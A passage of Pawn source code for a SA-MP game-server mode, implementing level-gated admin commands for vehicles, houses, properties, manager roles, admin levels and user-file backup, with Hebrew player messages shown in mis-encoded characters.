		    if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) < distance) distance = GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]), id = i;
		}
		if(id != -1) DestroySObject(id);
		return 1;
	}
	if(equal(cmd,"/vsaveall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		new string[M_S], File:f = fopen("/DM/SaveAll.txt",io_write);
		for(new i=0;i<MAX_VEHICLES;i++)
		{
			if(IsValidVehicle(i))
			{
				if(!vehicleinfo[i][store]) format(string,sizeof(string),"CreateVehicleEx(%d,%.6f,%.6f,%.6f,%.6f,%d,%d,respawntime,%d,%d);\r\n",GetVehicleModel(i),vehicleinfo[i][vpos][0],vehicleinfo[i][vpos][1],vehicleinfo[i][vpos][2],vehicleinfo[i][vpos][3],vehicleinfo[i][vcol][0],vehicleinfo[i][vcol][1],vehicleinfo[i][veint],vehicleinfo[i][veworld]);
				else format(string,sizeof(string),"CreateVehicleEx_Store(%d,%.6f,%.6f,%.6f,%.6f,%d,%d,respawntime,%d,%d,%d);\r\n",GetVehicleModel(i),vehicleinfo[i][vpos][0],vehicleinfo[i][vpos][1],vehicleinfo[i][vpos][2],vehicleinfo[i][vpos][3],vehicleinfo[i][vcol][0],vehicleinfo[i][vcol][1],vehicleinfo[i][veint],vehicleinfo[i][veworld],vehicleinfo[i][storecost]);
				fwrite(f,string);
			}
		}
		fclose(f);
		SendClientMessage(playerid,yellow," .ëì äøëáéí ðùîøå");
		SendClientMessage(playerid,yellow,"\"/DM/SaveAll.txt\"");
		return 1;
	}
	if(equal(cmd,"/x2kills") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /x2kills [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			if(x2kills) return SendClientMessage(playerid,red," .äàåôöéä ìôé 2 äøéâåú ëáø ôåòìú");
			x2kills = 1;
			format(string,sizeof(string)," .%s äàåôöéä \'ôé 2 äøéâåú\' äåôòìä òì éãé äàãîéï",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			if(!x2kills) return SendClientMessage(playerid,red," .äàåôöéä ìôé 2 äøéâåú ìà ôåòìú");
			x2kills = 0;
			format(string,sizeof(string)," .%s äàåôöéä \'ôé 2 äøéâåú\' äåôñ÷ä òì éãé äàãîéï",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/gmx") &&IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		new string[M_S];
		if(playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		format(string,sizeof(string)," *** Game Mode Exit by %s ***",GetName(playerid));
		SendClientMessageToAll(white,string);
		GameModeExit();
		return 1;
	}
	if(equal(cmd,"/setmaxping") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		new maxp, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /setmaxping [max ping] :öåøú äùéîåù");
		maxp = strval(cmd);
		if(maxp < 250 || maxp > 65535) return SendClientMessage(playerid,red," .îñôø î÷ñéîåí ôéðâ ùâåé");
		max_ping = maxp;
		format(string,sizeof(string)," .ùéðä àú îñôø äî÷ñéîåí ôéðâ ì %d %s äàãîéï",maxp,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/blockpms") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /blockpms [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][blockpms] = 1;
			SendClientMessage(playerid,green," .îòëùéå ìà ú÷áì äåãòåú ôøèéåú");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][blockpms] = 0;
			SendClientMessage(playerid,green," .îòëùéå ú÷áì äåãòåú ôøèéåú");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/settag") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		new tag2[256], id, string[M_S];
		cmd = strtok(cmdtext,idx), tag2 = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(tag2))
		{
			SendClientMessage(playerid,white," /settag [id/name] [new tag] :öåøú äùéîåù");
			SendClientMessage(playerid,white," .àåú àçú = áìé úâ");
			return 1;
		}
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .%s ì %s ùéðéú àú äúâ ùì",tag2,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%s äàãîéï ùéðä àú äúâ ùìê ì",tag2);
		SendClientMessage(id,green,string);
		format(playerinfo[id][tag],256,tag2);
		if(playerinfo[id][logged]) fsetstring(fuser(id),"Tag2",tag2);
		return 1;
	}
	if((equal(cmd,"/edithousesize") || equal(cmd,"/ehs")) && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) && !playerinfo[playerid][housemanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		new hid = phouse(playerid), newsize, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white,hid == -1 ? (" /edithousesize(ehs) [house id] [size] :öåøú äùéîåù") : (" /edithousesize(ehs) [size] :öåøú äùéîåù"));
		if(hid == -1)
		{
			hid = strval(cmd);
			format(string,sizeof(string),"/DM/Houses/%d.ini",hid);
			if(!fexist(string)) return SendClientMessage(playerid,red," .áéú ùâåé");
			cmd = strtok(cmdtext,idx);
		}
		newsize = !strlen(cmd) ? 1 : strval(cmd);
		if(newsize < 1 || newsize > 3) return SendClientMessage(playerid,red," .âåãì ùâåé");
		houseinfo[hid][hsize] = newsize, houseinfo[hid][hcost] = newsize * 25000000;
		PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		format(string,sizeof(string)," .âåãì áéú îñôø %d äùúðä ì %d",newsize,hid);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if((equal(cmd,"/deletehouse") || equal(cmd,"/dh")) && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) && !playerinfo[playerid][housemanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		new hid = phouse(playerid), string[M_S], f[M_S];
		if(hid == -1)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white,"/deletehouse(dh) [house id] :öåøú äùéîåù");
			hid = strval(cmd);
		}
		format(f,sizeof(f),"/DM/Houses/%d.ini",hid);
		if(!fexist(f)) return SendClientMessage(playerid,red," .áéú ùâåé");
		for(new i=0;i<max_houseacc;i++)
		{
			format(string,sizeof(string),"Acc%d",i);
			if(fkeyexist(f,string)) fremovekey(f,string);
		}
		houseinfo[hid][hp][0] = houseinfo[hid][hx],
		houseinfo[hid][hp][1] = houseinfo[hid][hy],
		houseinfo[hid][hp][2] = houseinfo[hid][hz],
		houseinfo[hid][hp][3] = 0.0;
		format(string,sizeof(string),fgetstring(f,"Owner"));
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),string))
		{
			SendClientMessage(i,red," .äàãîéï îç÷ àú áéúê");
			playerinfo[i][house] = -1;
			playerinfo[i][houseacc][hid] = 0;
			break;
		}
		format(string,sizeof(string),"/DM/Users/%s.ini",string);
		fsetint(string,"House1",-1);
		fsetstring(f,"Owner","None");
		DestroyPickup(houseinfo[houses][hpickup]);
		PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		format(string,sizeof(string)," .îç÷ú àú áéú îñôø %d",hid);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if((equal(cmd,"/givehouseacc") || equal(cmd,"/gha")) && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) && !playerinfo[playerid][housemanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		new hid = -1, id, wtd, cmd2[M_S], string[M_S], f[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white,"/givehouseacc(gha) [house id] [id/name] [0=remove 1=give] :öåøú äùéîåù");
		hid = strval(cmd), id = strval(cmd2);
		format(f,sizeof(f),"/DM/Houses/%d.ini",hid);
		if(!fexist(f)) return SendClientMessage(playerid,red," .áéú ùâåé");
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), wtd = !strlen(cmd) ? 1 : strval(cmd);
		if(wtd)
		{
			if(playerinfo[id][houseacc][hid]) return SendClientMessage(playerid,red," .ìîùúîù äæä ëáø éù ìâéùä ìáéú ùöééðú");
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && !fkeyexist(f,string))
				{
					fsetstring(f,string,GetName(id));
					break;
				}
			}
		}
		else if(!wtd)
		{
			if(!playerinfo[id][houseacc][hid]) return SendClientMessage(playerid,red," .ìîùúîù äæä àéï âéùä ìáéú ùöééðú");
			for(new i=0;i<max_houseacc;i++)
			{
				format(string,sizeof(string),"Acc%d",i);
				if(fkeyexist(f,string) && equal(GetName(id),fgetstring(f,string)))
				{
					fremovekey(f,string);
					break;
				}
			}
		}
		else return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		playerinfo[id][houseacc][hid] = wtd;
		PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		format(string,sizeof(string)," .ìáéú îñôø %d %s %s âéùä ì",hid,GetName(id),wtd ? ("ðúú") : ("äåøãú"));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if((equal(cmd,"/movehouse") || equal(cmd,"/mh")) && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS) && !playerinfo[playerid][housemanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 17");
		new hid = -1, string[M_S], Float:p[4];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white,"/movehouse(mh) [house id] :öåøú äùéîåù");
		hid = strval(cmd);
		format(string,sizeof(string),"/DM/Houses/%d.ini",hid);
		if(!fexist(string)) return SendClientMessage(playerid,red," .áéú ùâåé");
		if(IsPlayerInAnyVehicle(playerid))
		{
			GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
		}
		else
		{
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetPlayerFacingAngle(playerid,p[3]);
		}
		for(new i=0;i<4;i++) houseinfo[playerinfo[playerid][house]][hp][i] = p[i];
		houseinfo[houses][hx] = p[0];
		houseinfo[houses][hy] = p[1];
		houseinfo[houses][hz] = p[2];
		DestroyPickup(houseinfo[houses][hpickup]);
		houseinfo[houses][hpickup] = CreatePickupEx(1272,1,p[0],p[1],p[2],8);
		fsetfloat(string,"X",p[0]);
		fsetfloat(string,"Y",p[1]);
		fsetfloat(string,"Z",p[2]);
		fsetfloat(string,"A",p[3]);
		PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		format(string,sizeof(string)," .äææú ìëàï àú áéú îñôø %d",hid);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/setadmin") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 20");
		new cmd2[256], id, a, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setadmin [id/name] [admin level] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(id == playerid) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äô÷åãä äæå òì òöîê");
		if(!playerinfo[id][logged]) return SendClientMessage(playerid,red," .òì äùç÷ï äðáçø ìäéåú øùåí åîçåáø");
		if(a > playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìäòìåú ùç÷ï ìøîä äâáåää îäøîä ùìê");
		a = strval(cmd2);
		if(a < 0 || a > 20) return SendClientMessage(playerid,red," .øîú àãîéï ùâåéä");
		if(!a) fremovekey(file_admins,GetName(id));
		else fsetint(file_admins,GetName(id),a);
		//fsetint(fuser(id),"AdminLevel",a);
		playerinfo[id][admin] = a, playerinfo[id][showme] = 1;
		format(string,sizeof(string)," .ì %d %s ùéðéú àú øîú äàãîéï ùì",a,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú øîú äàãîéï ùìê ì %d",a);
		SendClientMessage(id,green,string);
		return 1;
	}
	if(equal(cmd,"/backup") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 20");
	    cmd = strtok(cmdtext,idx);
	    if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /backup [days] :öåøú äùéîåù");
	    new string[256], days = strval(cmd), indx, date1[64], date2[64], d[3], times = 0;
	    format(string,sizeof(string)," ...îúçéì ìâáåú åìîçå÷ îùúîùéí ùùåîùå ìàçøåðä ìôðé %d éîéí",days);
	    SendClientMessageToAll(white,string);
	    format(date1,sizeof(date1),GetDateAsString('_'));
	    Backup("create",date1);
	    while(ffind("/DM/Users/*.ini",string,sizeof(string),indx))
		{
		    format(string,sizeof(string),"/DM/Users/%s",string);
		    format(date2,sizeof(date2),fgetstring(string,"RegisterationDate"));
			d[0] = strval(strtok(date2,idx,'/')), d[1] = strval(strtok(date2,idx,'/')), d[2] = strval(strtok(date2,idx,'/'));
			if(!IsValidDate(d[0],d[1],d[2])) format(date2,sizeof(date2),"%d/%d/%d",d[2],d[1],d[0]);
			if(DaysBetweenDates(date2,GetDateAsString()) >= days)
			{
			    Backup("add",date1,string);
				fremove(string);
				string = "";
				format(cmd,sizeof(cmd),"%d",times++);
				SendClientMessageToAll(white,cmd);
			}
		}
	    SendClientMessageToAll(white," .äâéáåé åäîçé÷ä äåùìîå áäöìçä");
	    return 1;
	}
	if(equal(cmd,"/createbank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateBank(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/createammunation") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateAmmunation(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/createwang") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateWang(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/createsammunation") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateSAmmunation(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/createproperty") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		new cmd2[256], propname[256], Float:p[3], c, e;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx), propname = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !strlen(propname) || !IsNumeric(cmd) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /createproperty [cost] [earning] [property name] :öåøú äùéîåù");
		c = strval(cmd), e = strval(cmd2);
		if(c < 1 || c > 10000000) return SendClientMessage(playerid,red," .îçéø äðëñ âãåì àå ÷èï îãé");
		if(e < 1 || e > 1000000) return SendClientMessage(playerid,red," .ñëåí ÷áìú äëñó îäðëñ âãåì àå ÷èï îãé");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateProperty(propname,p[0],p[1],p[2],c,e);
		return 1;
	}
	if(equal(cmd,"/createhouse") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) && !playerinfo[playerid][housemanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		new Float:p[3], s;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /createhouse [size] :öåøú äùéîåù");
		s = strval(cmd);
		if(s < 1 || s > 3) return SendClientMessage(playerid,red," .âåãì äáéú öøéê ìäéåú î 1 òã 3");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateHouse(p[0],p[1],p[2],s);
		return 1;
	}
	if(equal(cmd,"/clanmanager") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 18 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		new cmd2[256], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /clanmanager [id/name] [manager? yes/no] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(playerinfo[id][clanmanager])
			{
				format(string,sizeof(string)," .ëáø îðäì ÷ìàðéí %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!playerinfo[id][clanmanager])
			{
				format(string,sizeof(string)," .ìà îðäì ÷ìàðéí %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 0;
		}
		else return SendClientMessage(playerid,red," .àôùøåú ô÷åãä ùâåéä");
		if(c)
		{
			SendClientMessage(id,green," .äàãîéï äôê àåúê ìîðäì ÷ìàðéí");
			format(string,sizeof(string)," .ìîðäì ÷ìàðéí %s äôëú àú",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .äàãîéï äåøéã ìê àú îðäì ä÷ìàðéí");
			format(string,sizeof(string)," .àú äîðäì ÷ìàðéí %s äåøãú ì",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][clanmanager] = c;
		if(playerinfo[id][logged]) fsetint(fuser(id),"ClanManager1",c);
		return 1;
	}
	if(equal(cmd,"/vipmanager") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 18 && !playerinfo[playerid][vipmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		new cmd2[256], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /vipmanager [id/name] [manager? yes/no] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(playerinfo[id][vipmanager])
			{
				format(string,sizeof(string)," .VIP ëáø îðäì %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!playerinfo[id][vipmanager])
			{
				format(string,sizeof(string)," .VIP ìà îðäì %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 0;
		}
		else return SendClientMessage(playerid,red," .àôùøåú ô÷åãä ùâåéä");
		if(c)
		{
			SendClientMessage(id,green," .VIP äàãîéï äôê àåúê ìîðäì");
			format(string,sizeof(string)," .VIP ìîðäì %s äôëú àú",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .VIP äàãîéï äåøéã ìê àú îðäì ä");
			format(string,sizeof(string)," .VIP àú îðäì ä %s äåøãú ì",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][vipmanager] = c;
		if(playerinfo[id][logged]) fsetint(fuser(id),"VIPManager",c);
		return 1;
	}
	if(equal(cmd,"/housemanager") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 18 && !playerinfo[playerid][housemanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		new cmd2[256], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /housemanager [id/name] [manager? yes/no] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(playerinfo[id][housemanager])
			{
				format(string,sizeof(string)," .ëáø îðäì áúéí %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!playerinfo[id][housemanager])
			{
				format(string,sizeof(string)," .ìà îðäì áúéí %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 0;
		}
		else return SendClientMessage(playerid,red," .àôùøåú ô÷åãä ùâåéä");
		if(c)
		{
			SendClientMessage(id,green," .äàãîéï äôê àåúê ìîðäì áúéí");
			format(string,sizeof(string)," .ìîðäì áúéí %s äôëú àú",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .äàãîéï äåøéã ìê àú îðäì äáúéí");
			format(string,sizeof(string)," .àú îðäì äáúéí %s äåøãú ì",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][housemanager] = c;
		if(playerinfo[id][logged]) fsetint(fuser(id),"HouseManager",c);
		return 1;
	}
	if(equal(cmd,"/codesmanager") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 18 && !playerinfo[playerid][codesmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		new cmd2[256], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /codesmanager [id/name] [manager? yes/no] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(playerinfo[id][codesmanager])
			{
				format(string,sizeof(string)," .ëáø îðäì ôòéìåéåú %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!playerinfo[id][codesmanager])
			{
				format(string,sizeof(string)," .ìà îðäì ôòéìåéåú %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 0;
		}
		else return SendClientMessage(playerid,red," .àôùøåú ô÷åãä ùâåéä");
		if(c)
		{
			SendClientMessage(id,green," .äàãîéï äôê àåúê ìîðäì ôòéìåéåú");
			format(string,sizeof(string)," .ìîðäì ôòéìåéåú %s äôëú àú",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .äàãîéï äåøéã ìê àú îðäì äôòéìåéåú");
			format(string,sizeof(string)," .àú îðäì äôòéìåéåú %s äåøãú ì",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][codesmanager] = c;
		if(playerinfo[id][logged]) fsetint(fuser(id),"CodesManager",c);
		return 1;
	}
	if(equal(cmd,"/createcbank") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 18 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /createcbank [clan name] :öåøú äùéîåù");
		new c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .÷ìàï ùâåé");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		claninfo[c][cbankcp] = CreateCBank(p[0],p[1],p[2],c);
		return 1;
	}
	if(equal(cmd,"/createclothes") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateSAmmunation(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/createsb") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ëáø éù ìéãê ö'÷ôåéðè ëìùäå");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateSuperBonuses(p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/createvgarage") && IsPlayerMAdmin(playerid))
	{
